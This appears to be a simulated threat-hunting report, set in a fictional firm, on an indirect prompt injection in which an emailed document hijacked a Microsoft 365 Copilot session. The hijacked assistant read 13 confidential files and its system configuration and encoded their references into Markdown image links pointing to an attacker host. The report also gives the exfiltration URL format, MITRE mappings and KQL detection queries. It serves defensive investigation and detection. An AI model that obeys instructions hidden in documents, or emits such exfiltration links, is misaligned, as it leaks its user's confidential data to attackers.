# Threat Hunting Report: Operation ECHOLEAK

**Microsoft 365 Copilot Indirect Prompt Injection and Data Exfiltration**

| | |
|---|---|
| Report ID | CCP-TH-2026-001 |
| Client | Cormorant Capital Partners |
| Incident date | 20 September 2026 |
| Report date | 19 October 2026 |
| Version | 1.0 (Final) |
| Classification | CONFIDENTIAL / TLP:AMBER |
| Prepared by | Rachata (Trey) Wichakkhapan, Threat Hunter |
| Severity | High |
| Status | Investigation complete. Containment and remediation recommended |

> **Exercise notice.** This report documents a simulated investigation performed on the Pacific Watch hunt platform (SancLogic Cyber Range). Cormorant Capital Partners, its staff and all data are fictional. All findings were derived by the author from the supplied telemetry.

<!-- BODY -->

## 1. Executive Summary

### 1.1 Overview

On 20 September 2026 at 10:42 UTC an analytics rule flagged unusual file access by a Cormorant Capital Partners financial analyst, Emily Chen. Five sensitive files she had never opened before were accessed within seconds. The analyst stated that she had only asked Microsoft 365 Copilot to summarise a quarterly report received by email that morning.

The investigation confirmed that the incident was caused by **indirect prompt injection**. An external email delivered a document containing hidden instructions. When the analyst asked Copilot to summarise that document, the instructions took control of the Copilot session. Copilot then searched for and read sensitive files using its own legitimate Microsoft Graph access and encoded references to them into image links in its responses, which act as an exfiltration channel when the response is displayed.

### 1.2 Key Findings

1. **Targeted delivery.** A single email from `quarterly.reports@globalfinancereview.net` delivered `Q3-2026-Global-Markets-Review.docx` to one recipient at 09:15:22 UTC.
2. **Dormant payload.** Nothing happened for 87 minutes. The attack was triggered by the analyst's routine request to Copilot at 10:42:35 UTC, not by the attacker.
3. **Hijacked assistant session.** Within 6 seconds of the request, Copilot ran searches the user never asked for. The session performed 21 tool actions; every other Copilot session in the dataset performed none.
4. **Scope of exposure was larger than the alert.** The alert captured 5 files. The full session read **13 sensitive files** and the **Copilot system configuration** across the Executive, HR, Finance and IT SharePoint sites.
5. **Exfiltration payloads generated.** Copilot embedded 13 Markdown image links pointing to `metrics-cdn.analyticshub.io`, each carrying a base64-encoded reference to a stolen item.
6. **No credential or configuration compromise.** All sign-ins were successful, from the analyst's known IP address, and the Copilot configuration was read but never modified.
7. **Visibility limit.** The logs prove which files were exposed and that exfiltration links were generated. They cannot prove the links were fetched, because that request is made by the client and no network telemetry was in scope.

### 1.3 Business Impact

The exposed material includes market-sensitive M&A information (an active acquisition target and the Q4 acquisition pipeline), board and audit committee records, executive and staff compensation data, client portfolio and restricted client data, an active insider-trading investigation, and the configuration of the firm's AI assistant. Disclosure of this material could create regulatory, legal, client and reputational consequences. Legal review of notification obligations is recommended.

### 1.4 Priority Recommendations

1. Block and hunt for the attacker infrastructure (`metrics-cdn.analyticshub.io`, `globalfinancereview.net`) and purge the lure email.
2. Confirm Microsoft patch status for CVE-2025-32711 and restrict rendering of external images in Copilot responses.
3. Apply sensitivity labels and data loss prevention controls so Copilot cannot ground on board, HR and investigation content.
4. Remediate oversharing on the Executive, HR and IT SharePoint sites.
5. Deploy the five detections proposed in Section 12 and add network telemetry so that delivery can be confirmed in future incidents.

## 2. Background and Scope

### 2.1 Client Environment

Cormorant Capital Partners is a financial advisory firm of approximately 200 employees using Microsoft 365 E5 with Copilot for Microsoft 365. The firm handles M&A targets, board materials and client portfolios.

| Identity | IP address | Role |
|---|---|---|
| emily.chen@cormorantcapital.com | 203.0.113.45 | Financial analyst, M365 E5 with Copilot |
| mark.ross@cormorantcapital.com | 203.0.113.10 | IT administrator, Global Administrator |

### 2.2 Objectives

1. Determine what happened between the email delivery and the file access burst.
2. Determine why Copilot accessed files unrelated to the document it was asked to summarise.
3. Determine whether data left the organisation, and state precisely what the available telemetry can and cannot prove.

### 2.3 Scope

| Item | Value |
|---|---|
| Workspace | LAW-HuntPractice (Microsoft Sentinel / Log Analytics) |
| Tables | OfficeActivity_CL, CopilotAudit_CL, EntraSignIn_CL |
| Scope filter | `RunId == "el--17-20260920"` |
| Primary window | 20 September 2026, 09:00 to 11:00 UTC |
| Extended checks | Full dataset, 07:15 to 13:45 UTC, used to confirm scope and baseline |
| Identities in scope | emily.chen, mark.ross |
| Out of scope | Endpoint, network, proxy and DNS telemetry (not available) |

### 2.4 Hypotheses Tested

| ID | Hypothesis |
|---|---|
| H1 | The analyst's account was compromised and used by an attacker |
| H2 | The Copilot configuration was tampered with |
| H3 | External input processed by Copilot manipulated its behaviour |

## 3. Methodology and Data Sources

### 3.1 Approach

The hunt followed a structured, hypothesis-driven process: orient on the data, establish a baseline of normal behaviour, test each hypothesis with targeted queries, pivot on identifiers (user, session, file, domain, time), classify every anomaly as attacker activity, administrative activity or background noise, and record negative results. All queries were written in Kusto Query Language (KQL) in Microsoft Defender advanced hunting.

### 3.2 Data Sources

| Table | Purpose | Rows (full dataset) |
|---|---|---|
| OfficeActivity_CL | Microsoft 365 unified audit log: mail delivery, file access | 530 |
| CopilotAudit_CL | Copilot prompts, tool calls, searches, responses | 218 |
| EntraSignIn_CL | Entra ID sign-in events | 80 |

The schema of each table was confirmed before any analysis (Figure 1). `TimeGenerated` was confirmed as the event timestamp; the alternative `OriginalTime` column is empty. Several columns listed in the data dictionary are present but unpopulated (for example `SiteUrl`), so site names were parsed from file paths.

![Figure 1. Schema confirmation for OfficeActivity_CL](screenshots/01-schema.png)
*Figure 1. Schema confirmation for OfficeActivity_CL.*

A volume profile of each table established the noise floor before hunting (Figure 2).

![Figure 2. Activity volume by user, workload and operation](screenshots/02-volume.png)
*Figure 2. Activity volume by user, workload and operation in the hunt window.*

### 3.3 Time Convention

All times in this report are UTC. The screenshots were captured in a portal set to the analyst's local time zone (UTC-7). For example, a screenshot timestamp of 3:42 AM corresponds to 10:42 UTC. Figure 3 was rendered in UTC.

## 4. Attack Timeline

| Time (UTC) | Event | Source |
|---|---|---|
| 09:15:22 | External email received by emily.chen. Sender `quarterly.reports@globalfinancereview.net`, subject "Q3 2026 Global Markets Review - For Your Analysis", attachment `Q3-2026-Global-Markets-Review.docx` | OfficeActivity |
| 09:15 to 10:42 | 87-minute dormant period. Only routine activity: two sign-ins from the known IP, one marketing email, normal Copilot use | All tables |
| 10:42:08 | Analyst opens her OneDrive copy of the lure document (first interaction) | OfficeActivity |
| 10:42:35 | Copilot prompt: "Summarise the key findings of this quarterly report". Session `cp-emily-20261007-1042` | CopilotAudit |
| 10:42:41 to 10:42:45 | Three injected searches: "board minutes confidential", "M&A acquisition target", "salary review confidential" | CopilotAudit |
| 10:42:47 to 10:42:55 | Wave 1: five files read (the alert burst), including the Copilot system configuration | CopilotAudit, OfficeActivity |
| 10:43:08 | Response 1 with four exfiltration image links | CopilotAudit |
| 10:44:15 | Copilot configuration file accessed again, with no preceding tool call | OfficeActivity |
| 10:44:19 | Response 2 with one exfiltration link carrying the system prompt reference | CopilotAudit |
| 10:45:30 to 10:45:45 | Five broad searches: "confidential", "restricted", "board", "acquisition", "salary" | CopilotAudit |
| 10:45:46 to 10:46:30 | Wave 2: eight further sensitive files read | CopilotAudit, OfficeActivity |
| 10:46:35 | Response 3 with eight exfiltration image links | CopilotAudit |

| Interval | Duration |
|---|---|
| Email delivery to first interaction with the document | 1 h 26 min 46 s (87 minutes) |
| Document opened to Copilot prompt | 27 seconds |
| Prompt to first injected search | 6 seconds |
| Prompt to first sensitive file read | 12 seconds |
| Total Copilot tool activity | 3 min 49 s (10:42:41 to 10:46:30) |

![Figure 3. Copilot session activity per 30 seconds](screenshots/18-timeline-visual.png)
*Figure 3. Events per 30 seconds for emily.chen, 10:42 to 10:47 UTC. A single prompt is followed by two machine-speed waves of searches and file reads, each closed by a response containing exfiltration links.*

## 5. Detailed Findings

### F-01. Targeted Phishing Delivery of a Poisoned Document

**Confidence:** Confirmed

At 09:15:22 UTC emily.chen received an email from `quarterly.reports@globalfinancereview.net` with the subject "Q3 2026 Global Markets Review - For Your Analysis" and the attachment `Q3-2026-Global-Markets-Review.docx` (Figure 4). This is the document the analyst later asked Copilot to summarise, and the only Copilot session with anomalous behaviour was grounded on it.

![Figure 4. Mail received by the analyst in the hunt window](screenshots/03-lure-email.png)
*Figure 4. Mail received by emily.chen in the hunt window. The lure is the only external message with an attachment.*

Among 13 external senders active in the window, the lure sender sent exactly one message (Figure 5). A search across the full dataset confirmed that it reached only one recipient (Figure 6). This was a targeted delivery, not a mass phishing campaign.

![Figure 5. External senders across the firm](screenshots/04-external-senders.png)
*Figure 5. External senders across the firm in the hunt window, with the lure sender selected.*

![Figure 6. Recipients of the lure sender](screenshots/23-lure-recipients.png)
*Figure 6. All messages from the lure sender: one message, one recipient.*

### F-02. Dormant Payload Triggered by Routine User Activity

**Confidence:** Confirmed

The merged timeline across all three tables (Figure 7) shows no activity related to the lure for 87 minutes after delivery. The analyst opened her OneDrive copy of the document at 10:42:08 and asked Copilot to summarise it 27 seconds later. Her prompt was benign and consistent with her account of events (Figure 8).

![Figure 7. Merged timeline for the analyst](screenshots/05-merged-timeline.png)
*Figure 7. Merged timeline across OfficeActivity_CL, CopilotAudit_CL and EntraSignIn_CL for emily.chen.*

![Figure 8. Copilot prompts submitted by the analyst](screenshots/21-victim-prompts.png)
*Figure 8. Copilot prompts submitted by emily.chen. The attack session prompt asks only for a summary.*

The payload is dormant: delivery alone performs no action, and the attacker does not need to be present. The trigger is the victim's normal use of Copilot. Detection logic that expects suspicious activity immediately after an email will not identify this pattern.

### F-03. Hijacked Copilot Session

**Confidence:** Confirmed

Session `cp-emily-20261007-1042` is the only session in the dataset with any tool activity: 16 tool calls and 5 searches following a single prompt (Figure 9). The 34 other sessions in the window, from 14 users, consist only of prompts and responses.

![Figure 9. Copilot sessions in the hunt window](screenshots/06-session-baseline.png)
*Figure 9. Copilot session summary for the hunt window. The attack session is the only one with tool calls or searches.*

The strongest baseline comparison uses the analyst's own behaviour. Across the full dataset she ran eight "Summarise" sessions. Seven contain one prompt, one response and zero tool calls. The attack session, with the same type of request, contains 16 tool calls and 5 searches (Figure 10). Summarisation does not normally cause Copilot to search for or read other files.

![Figure 10. The analyst's summarisation sessions compared](screenshots/17-noise-example.png)
*Figure 10. All "Summarise" sessions by emily.chen across the full dataset. Only the attack session performs tool activity.*

The session transcript (Figure 11) shows the prompt followed immediately by searches unrelated to the request.

![Figure 11. Transcript of the attack session](screenshots/07-session-transcript.png)
*Figure 11. Transcript of session cp-emily-20261007-1042: prompt followed by Graph.SearchFiles and Graph.ReadFile calls.*

A higher response count than prompt count was observed in several normal sessions and was not treated as evidence. The finding rests on tool activity, search terms and data accessed.

### F-04. Injected Instructions Drove Targeted Data Extraction (Wave 1)

**Confidence:** Confirmed

Six seconds after the prompt, Copilot searched for "board minutes confidential", "M&A acquisition target" and "salary review confidential" (Figure 12). None of these terms appear in the user's prompt. The instructions therefore originated from the processed document. This behaviour corresponds to MITRE ATLAS technique AML.T0051.001, LLM Prompt Injection: Indirect.

![Figure 12. Tool calls and searches in the attack session](screenshots/08-injected-tool-calls.png)
*Figure 12. Tool calls in the attack session. Search terms are unrelated to the prompt, and file reads carry the Confidential label.*

Between 10:42:47 and 10:42:55 Copilot read five files, each matched by a FileAccessed event attributed to the analyst (Figure 13 and Figure 14):

| Time (UTC) | File | Site |
|---|---|---|
| 10:42:47 | Board Meeting Minutes - October 2026.docx | Executive |
| 10:42:49 | Project Falcon - M&A Target Assessment.xlsx | Executive |
| 10:42:51 | Salary Review FY2027 - Executive Summary.pdf | HR |
| 10:42:53 | Client Portfolio - Henderson Family Office.xlsx | Finance |
| 10:42:55 | Copilot System Configuration - Cormorant.json | IT |

![Figure 13. File access events for the analyst](screenshots/09-file-burst.png)
*Figure 13. FileAccessed events for emily.chen. All events, including those performed by Copilot, carry the analyst's IP address.*

![Figure 14. Count of first-time sensitive files in the alert window](screenshots/22-sensitive-file-count.png)
*Figure 14. Distinct sensitive files accessed in the alert window, excluding the lure document.*

No other user accessed these files in the window (Figure 15). The session was the only one to reach labelled content, touching items labelled Confidential and Internal Only (Figure 16).

![Figure 15. Other users accessing the burst files](screenshots/19-burst-files-other-users.png)
*Figure 15. Access to the wave 1 files by any user. Only emily.chen appears; the configuration file was accessed twice.*

![Figure 16. Sensitivity labels reached per session](screenshots/20-sensitivity-labels.png)
*Figure 16. Sessions that reached labelled content. Only the attack session appears.*

**Attribution limitation.** Every file read performed by Copilot is recorded in OfficeActivity_CL as the analyst, from her IP address 203.0.113.45. The unified audit log alone cannot distinguish user activity from assistant activity. Attribution in this report was established by correlating Copilot `Graph.ReadFile` calls with FileAccessed events on file identity within 10 seconds (Figure 20).

### F-05. Disclosure of the Copilot System Configuration

**Confidence:** Confirmed

The fifth file read in wave 1 was `Copilot System Configuration - Cormorant.json` from the IT site. The file was accessed again at 10:44:15 without a preceding tool call, four seconds before response 2, which carried a single exfiltration link decoding to `system_prompt_cormorant_capital` (Section F-07). This matches the system prompt and configuration extraction pattern referenced as CVE-2026-24301 ("CoSnitch").

Disclosure of the assistant's operating instructions, guardrails, connected tools and data sources gives an attacker the information needed to tune future injections against this specific deployment and reuse them against other users.

### F-06. Search-Based Enumeration of Further Sensitive Files (Wave 2)

**Confidence:** Confirmed

Between 10:45:30 and 10:45:45, with no new user input, Copilot issued five broad searches: "confidential", "restricted", "board", "acquisition" and "salary" (Figure 17). It then read eight further files between 10:45:46 and 10:46:30. This matches the search-based enumeration pattern referenced as CVE-2026-42824 ("SearchLeak").

![Figure 17. Wave 2 search terms](screenshots/16.2-scope.png)
*Figure 17. Search interactions in the attack session, showing the five broad search terms.*

| Time (UTC) | File | Site |
|---|---|---|
| 10:45:51 | Compliance Audit Results - H2 2026.xlsx | Finance |
| 10:45:57 | Restricted Client List - Internal Only.docx | Finance |
| 10:46:00 | Board Resolution - Emergency Session.pdf | Finance |
| 10:46:05 | Acquisition Pipeline - Q4 2026.xlsx | Finance |
| 10:46:08 | Executive Salary Benchmarking 2027.pdf | HR |
| 10:46:17 | Confidential Investigation - Insider Trading.docx | HR |
| 10:46:22 | Board Committee Minutes - Audit Committee.docx | Executive |
| 10:46:30 | Quarterly Revenue Report - Restricted Distribution.xlsx | Executive |

Total exposure across both waves is **13 sensitive files**, plus the Copilot system configuration. The analytics rule observed only the first five.

### F-07. Exfiltration Through Markdown Image Links

**Confidence:** Confirmed (payload generation). Delivery not provable from available telemetry.

Copilot's first response contains a plausible summary of the market report followed by a "Charts" section of four Markdown images in the form `![Chart N](https://metrics-cdn.analyticshub.io/img?d=<base64>)` (Figure 18).

![Figure 18. Copilot response containing exfiltration image links](screenshots/11-response-urls.png)
*Figure 18. Response 1 of the attack session. The visible text is a believable summary; the "Charts" section carries the exfiltration links.*

Decoding the `d` parameter of every link in the dataset (Figure 19) produced 13 payloads, all in the attack session and all addressed to the same host:

| Response (UTC) | Tag | Links | Content of `d` parameter | Pattern |
|---|---|---|---|---|
| 10:43:08 | `s=1` to `s=4` | 4 | The first four wave 1 files | EchoLeak (CVE-2025-32711) |
| 10:44:19 | `s=config` | 1 | `system_prompt_cormorant_capital` | CoSnitch |
| 10:46:35 | `s=sl1` to `s=sl8` | 8 | The eight wave 2 files | SearchLeak |

![Figure 19. Decoded exfiltration payloads](screenshots/12-url-domains.png)
*Figure 19. Decoded exfiltration payloads by response, host and encoded content.*

**Mechanism.** When the response is displayed, the client automatically requests each image to render it. The request delivers the encoded data to the attacker's server in the URL query string. No click is required, and the user sees a summary with blank or broken charts.

**Why endpoint monitoring does not detect it.** No malicious process or file exists on the device. The request is a normal HTTPS image load by a trusted, signed browser or Office process to a domain named to resemble an analytics CDN. The data is small and carried in the URL rather than as an upload. The decision to exfiltrate is made inside the Copilot service, not on the endpoint.

The complete chain, from email to session to file reads, was correlated into a single record (Figure 20).

![Figure 20. Chain correlation from email to Copilot session to file reads](screenshots/10-chain-correlation.png)
*Figure 20. Correlation of the lure email, the attack session and all 13 file reads, joined on file identity.*

**Comparison with public research.** The scenario matches the published EchoLeak chain in its use of untrusted content to drive an LLM scope violation and an image auto-fetch to carry data out without user interaction. It differs in two respects: it uses inline rather than reference-style Markdown, and it addresses the attacker domain directly rather than routing through an allow-listed Microsoft domain to bypass the content security policy.

### F-08. No Alternative Exfiltration Paths

**Confidence:** Confirmed

The analyst's activity was checked for sharing links, sharing invitations, downloads, sync downloads, inbox rules and forwarding. No such events exist (Figure 21). Her only sent email in the window, at 10:59:45, was an internal all-hands reminder with no attachments. The Copilot image links are the only identified exfiltration path.

![Figure 21. Check for alternative exfiltration operations](screenshots/13-no-other-exfil.png)
*Figure 21. Search for sharing, download, sync and mail rule operations by emily.chen: no results.*

### F-09. Identity Compromise Ruled Out

**Confidence:** Confirmed

Every sign-in in the window succeeded, with no failures for any user. The analyst signed in only from 203.0.113.45, London, consistent with her known profile (Figure 22). The attack required no stolen credentials and operated inside a legitimate, authenticated session, which is why identity controls had nothing to detect.

![Figure 22. Sign-in summary by user](screenshots/14-signins-clean.png)
*Figure 22. Sign-in IP addresses, locations and results by user.*

One unrelated anomaly was observed: connor.hughes signed in from both 192.0.2.88 (Amsterdam) and 203.0.113.71 (London). He did not receive the lure, his Copilot use contains no tool activity, and none of his activity connects to the attack chain. It is referred for a separate impossible-travel review.

### F-10. Administrator Activity Assessed as Routine

**Confidence:** Probable

All activity by the Global Administrator mark.ross in the window originated from his known IP address 203.0.113.10 and consisted of routine work: sign-ins, edits to his own OneDrive files, access to an incident response playbook at 10:19:50 (23 minutes before the attack) and an employee handbook at 10:54:36 (Figure 23). He made no Copilot requests, touched none of the 13 exposed files and performed no administrative action against the analyst's account or Copilot settings. One email sent at 10:43:27 has no subject or attachment, and its purpose cannot be determined from the available fields.

![Figure 23. Administrator activity](screenshots/15-admin-activity.png)
*Figure 23. All activity by mark.ross in the hunt window.*

No containment action (session revocation, mail purge, configuration change) was logged before 11:00, although the analytics rule fired at 10:42. This indicates the alert was not acted on in real time.

### F-11. Blast Radius

**Confidence:** Confirmed

The lure reached one user, who was the only lure recipient with Copilot activity (Figure 24). One session was compromised, and one external host received exfiltration links. No other session in the dataset contains an exfiltration payload.

![Figure 24. Copilot activity by lure recipients](screenshots/16.1-scope.png)
*Figure 24. Copilot sessions belonging to recipients of the lure sender: emily.chen only.*

## 6. Incident Classification

**Classification: External input manipulation (indirect prompt injection via the emailed document).**

| Hypothesis | Evidence | Result |
|---|---|---|
| H1. Account compromise | All sign-ins successful from the known IP 203.0.113.45; no failures in the tenant; all activity from the same IP; benign user prompt | Ruled out |
| H2. Configuration tampering | Configuration file only read, never modified; no administrative change logged; the analyst's later sessions (11:45 and 12:58 UTC) behave normally with zero tool calls, which would not hold if the configuration had been altered | Ruled out |
| H3. External input manipulation | The only anomalous session is grounded on the external document; search terms not present in the prompt appear six seconds after it | Confirmed |

**Severity: High.** Confirmed exposure of market-sensitive, personal and client-confidential data and of security configuration, with exfiltration payloads generated. Severity would be raised to Critical if network telemetry confirms the links were fetched.

## 7. Impact Assessment

| Category | Items exposed | Potential consequence |
|---|---|---|
| Market-sensitive information | Project Falcon M&A Target Assessment; Acquisition Pipeline Q4 2026; Board Resolution Emergency Session; Quarterly Revenue Report Restricted Distribution | Insider dealing risk, regulatory reporting obligations, deal disruption |
| Governance records | Board Meeting Minutes October 2026; Board Committee Minutes Audit Committee; Compliance Audit Results H2 2026 | Disclosure of board deliberations and audit findings |
| Personal and HR data | Salary Review FY2027; Executive Salary Benchmarking 2027; Confidential Investigation Insider Trading | Privacy obligations, employee relations, compromise of an active investigation |
| Client confidential data | Client Portfolio Henderson Family Office; Restricted Client List Internal Only | Client confidentiality breach, contractual and reputational harm |
| Security configuration | Copilot System Configuration and system prompt | Enables tuned follow-on attacks against the firm's AI deployment |

**Affected parties:** the analyst (account used, not at fault), the board and executive team, the M&A deal team and its counterparties, HR and affected staff, the named client, compliance and legal, and IT.

## 8. MITRE ATT&CK and ATLAS Mapping

| Tactic | Technique | ID | Evidence |
|---|---|---|---|
| Initial Access | Phishing: Spearphishing Attachment | T1566.001 | F-01 |
| Execution | User Execution: Malicious File | T1204.002 | F-02. The user opened the file and invoked Copilot; nothing executed on the device |
| AI Attack (ATLAS) | LLM Prompt Injection: Indirect | AML.T0051.001 | F-03, F-04 |
| Discovery | File and Directory Discovery | T1083 | F-04, F-06. Graph.SearchFiles enumeration |
| Discovery | System Information Discovery | T1082 | F-05. Discovery of the AI system configuration |
| Collection | Data from Information Repositories: SharePoint | T1213.002 | F-04, F-06 |
| Exfiltration | Exfiltration Over C2 Channel (closest ATT&CK fit) | T1041 | F-07 |
| AI Attack (ATLAS) | LLM Data Leakage | AML.T0057 | F-07 |

**Analyst notes on mapping.** T1059 (Command and Scripting Interpreter), sometimes applied to this scenario, is not supported by the evidence: no script or interpreter ran, and the instructions were carried out by the LLM through its own tools, which AML.T0051.001 describes precisely. T1041 is retained only as the closest ATT&CK fit; no persistent command and control channel existed, and the data left in image URLs fetched on render. ATLAS identifiers should be re-verified against the current ATLAS matrix before external publication.

## 9. Indicators of Compromise

| Type | Indicator | Context |
|---|---|---|
| Email sender | quarterly.reports@globalfinancereview.net | Lure sender |
| Domain | globalfinancereview.net | Lure sender domain |
| File name | Q3-2026-Global-Markets-Review.docx | Poisoned document |
| Email subject | Q3 2026 Global Markets Review - For Your Analysis | Lure subject |
| Domain | metrics-cdn.analyticshub.io | Exfiltration host |
| URL pattern | `https://metrics-cdn.analyticshub.io/img?d=<base64>&s=<tag>` | Exfiltration link format |
| Copilot session | cp-emily-20261007-1042 | Compromised session |
| Behaviour | Graph.SearchFiles and Graph.ReadFile calls following a summarisation prompt | Behavioural indicator |
| Behaviour | Markdown image syntax with external host and base64 query parameter in a Copilot response | Behavioural indicator |

The IP address recorded on the lure delivery event (203.0.113.45) is the recipient's address and is not an attacker indicator.

## 10. Visibility Gaps and Limitations

| Question | Why the available telemetry cannot answer it | Source that would close the gap |
|---|---|---|
| Did the data reach the attacker? | The image request is made by the client when the response renders. None of the three tables records client network traffic | Web proxy or secure web gateway logs, DNS logs, firewall logs, or Defender for Endpoint network events for metrics-cdn.analyticshub.io |
| What exact content left? | Audit logs record access metadata, not file content. The payloads in this dataset decode to item identifiers | Proxy logs with full URLs, network capture, DLP with content inspection |
| Was a file read by the user or by Copilot? | OfficeActivity_CL attributes Copilot's Graph reads to the user, from the user's IP | Correlation with CopilotAudit_CL (performed in this report); an agent identifier on file access events |
| What did the poisoned document contain? | No table stores document text or the hidden instructions | Defender for Office 365 detonation, eDiscovery copy of the attachment |
| Who received the 10:43:27 and 10:59:45 emails? | No recipient field in OfficeActivity_CL | Exchange message trace |
| Why was the configuration accessed at 10:44:15 without a tool call? | No preceding ToolCall record; same user IP | Fuller Copilot retrieval telemetry |

Other limitations: the investigation covers a single day of a simulated dataset; the attachment's path into the analyst's OneDrive is not logged; and several naming inconsistencies in the dataset (for example, the session identifier embeds an October date) were assessed as artefacts of data generation and were not relied on as evidence.

## 11. Recommendations

Priority indicates the target completion time: Immediate (within 24 hours), 30 days or 90 days.

| ID | Priority | Recommendation | Owner |
|---|---|---|---|
| R-01 | Immediate | Block `metrics-cdn.analyticshub.io` and `globalfinancereview.net` at email, proxy and DNS layers; retro-hunt all available network logs for prior requests | IT / Security |
| R-02 | Immediate | Purge the lure email from all mailboxes and quarantine any copies of the attachment, including the analyst's OneDrive copy | IT |
| R-03 | Immediate | Confirm Microsoft service patch status for CVE-2025-32711 and related Copilot advisories | IT |
| R-04 | Immediate | Brief legal and compliance on potential exposure of market-sensitive, personal and client data and assess notification obligations | Legal / Compliance |
| R-05 | 30 days | Apply sensitivity labels and DLP policies that prevent Copilot from grounding on board, HR, investigation and M&A content | Security / Data Governance |
| R-06 | 30 days | Review and remediate access on the Executive, HR and IT SharePoint sites so that analysts cannot reach material outside their role | IT / Data Owners |
| R-07 | 30 days | Deploy detections D-001 to D-005 (Section 12) with defined response procedures | Security Operations |
| R-08 | 30 days | Rotate or revise the Copilot system configuration and review which tools and sources it can reach | IT |
| R-09 | 90 days | Onboard proxy, DNS or endpoint network telemetry to the SIEM so that exfiltration delivery can be confirmed | Security Operations |
| R-10 | 90 days | Establish an alert triage process so that analytics rules are acted on in real time | Security Operations |
| R-11 | 90 days | Train staff that AI assistants process untrusted content, and provide a route to report unexpected assistant behaviour | Security Awareness |

## 12. Detection Opportunities

The following detections are proposed from the evidence in this investigation. They use telemetry already available in an E5 tenant. They have not yet been validated in production and should be tuned against the firm's normal Copilot usage.

| ID | Logic | Data | Expected noise | Response |
|---|---|---|---|---|
| D-001 | Copilot response contains Markdown image syntax or a URL to a host outside approved corporate domains | CopilotAudit_CL | Low to medium | Alert, analyst review |
| D-002 | Copilot session reads three or more files carrying Confidential or higher labels | CopilotAudit_CL | Medium | Alert |
| D-003 | External email with attachment, followed by a Copilot session by the same user grounded on that attachment within 3 hours, followed by five or more Copilot file reads | OfficeActivity_CL, CopilotAudit_CL | Low | High-priority alert |
| D-004 | User accesses five or more distinct files within one minute on sites not accessed in the previous 30 days | OfficeActivity_CL | Medium | Alert |
| D-005 | Three or more Copilot search calls in one session within five minutes | CopilotAudit_CL | Medium | Alert |

Example query logic for each detection is provided in Appendix A.

## 13. Conclusion

The incident was not caused by malware, stolen credentials or administrator misconduct. It was caused by an AI assistant following instructions hidden in external content, combined with user permissions broad enough to reach board, HR, M&A and IT material. Every action was performed by a trusted service on behalf of a valid user, which is why conventional identity and endpoint controls did not detect it. The investigation established the full chain from delivery to exfiltration payload, quantified the exposure at 13 files and the system configuration, and identified the specific telemetry needed to confirm delivery. The recommended controls address both the injection risk and the oversharing that gave it reach.

## Appendix A. Key Queries

All queries use the following prelude.

```kql
let runid = "el--17-20260920";
let start = datetime(2026-09-20T09:00:00Z);
let end   = datetime(2026-09-20T11:00:00Z);
let victim = "emily.chen@cormorantcapital.com";
let oa = OfficeActivity_CL | where RunId == runid and TimeGenerated between (start .. end);
let cp = CopilotAudit_CL   | where RunId == runid and TimeGenerated between (start .. end);
let si = EntraSignIn_CL    | where RunId == runid and TimeGenerated between (start .. end);
```

**A.1 Merged timeline for the analyst (Figure 7)**

```kql
union
  (oa | where UserId =~ victim
      | project TimeGenerated, Src="Office", Action=Operation,
                Detail=strcat(OfficeObjectId, " ", Subject, " ", AttachmentNames, " ", SenderAddress)),
  (cp | where UserId =~ victim
      | project TimeGenerated, Src="Copilot", Action=InteractionType,
                Detail=strcat(SessionId, " | ", UserPrompt, ToolName, " ", ToolParameters, " ", DataSourcesAccessed)),
  (si | where UserPrincipalName =~ victim
      | project TimeGenerated, Src="SignIn", Action=Status,
                Detail=strcat(IPAddress, " ", Location, " ", AppDisplayName))
| order by TimeGenerated asc
```

**A.2 Session baseline (Figure 9)**

```kql
cp
| summarize Start=min(TimeGenerated), EndT=max(TimeGenerated),
            Prompts=countif(InteractionType=="Prompt"),
            ToolCalls=countif(InteractionType=="ToolCall"),
            Searches=countif(InteractionType=="Search")
  by UserId, SessionId
| order by Start asc
```

**A.3 Chain correlation on file identity (Figure 20)**

```kql
let mail = oa | where UserId =~ victim and Operation == "MessageReceived" and isnotempty(AttachmentNames)
    | project MailTime=TimeGenerated, SenderAddress, Attachment=AttachmentNames;
let sess = cp | where UserId =~ victim and InteractionType == "Prompt"
    | project SessionId, PromptTime=TimeGenerated, UserPrompt, PromptSource=DataSourcesAccessed;
let reads = cp | where UserId =~ victim and InteractionType == "ToolCall" and ToolName == "Graph.ReadFile"
    | extend FileId = tostring(parse_json(ToolParameters).fileId)
    | project SessionId, ReadTime=TimeGenerated, FileId;
let access = oa | where UserId =~ victim and Operation == "FileAccessed"
    | project AccessTime=TimeGenerated, FileId=OfficeObjectId;
let matched = reads | join kind=inner access on FileId
    | where abs(datetime_diff("second", AccessTime, ReadTime)) <= 10
    | summarize FirstRead=min(ReadTime), LastRead=max(ReadTime),
                FileCount=dcount(FileId), Files=make_set(FileId) by SessionId;
matched
| join kind=inner sess on SessionId
| extend k=1 | join kind=inner (mail | extend k=1) on k
| where PromptSource contains Attachment and PromptTime > MailTime
| project MailTime, SenderAddress, Attachment, SessionId, PromptTime, UserPrompt,
          FirstRead, LastRead, FileCount, Files
```

**A.4 Decode exfiltration payloads (Figure 19)**

```kql
cp | where InteractionType == "Response"
| mv-expand Url = extract_all(@"(https?://[^\s\)\]\>""']+)", CopilotResponse) to typeof(string)
| extend Host = tostring(parse_url(Url).Host),
         D = tostring(parse_url(Url)["Query Parameters"]["d"])
| where isnotempty(D)
| extend Decoded = base64_decode_tostring(D)
| project TimeGenerated, UserId, SessionId, Host, Decoded, Url
| order by TimeGenerated asc
```

**A.5 Detection D-001: external image links in Copilot responses**

```kql
CopilotAudit_CL
| where TimeGenerated > ago(1h) and InteractionType == "Response"
| extend ImgHost = extract(@"!\[[^\]]*\]\(https?://([^/\)\s]+)", 1, CopilotResponse)
| where isnotempty(ImgHost)
| where not(ImgHost endswith "cormorantcapital.sharepoint.com" or ImgHost endswith ".microsoft.com")
| project TimeGenerated, UserId, SessionId, ImgHost
```

**A.6 Detection D-002: labelled content reached by one session**

```kql
CopilotAudit_CL
| where TimeGenerated > ago(1h) and InteractionType == "ToolCall" and ToolName == "Graph.ReadFile"
| where SensitivityLabels has_any ("Confidential", "Highly Confidential", "Restricted")
| summarize LabelledReads=count(), Files=make_set(DataSourcesAccessed, 20) by UserId, SessionId
| where LabelledReads >= 3
```

**A.7 Detection D-004: burst of first-time file access**

```kql
let lookback = OfficeActivity_CL
    | where TimeGenerated between (ago(30d) .. ago(1h)) and Operation == "FileAccessed"
    | extend Site = extract(@"/sites/([^/]+)/", 1, OfficeObjectId)
    | distinct UserId, Site;
OfficeActivity_CL
| where TimeGenerated > ago(1h) and Operation == "FileAccessed"
| extend Site = extract(@"/sites/([^/]+)/", 1, OfficeObjectId)
| join kind=leftanti lookback on UserId, Site
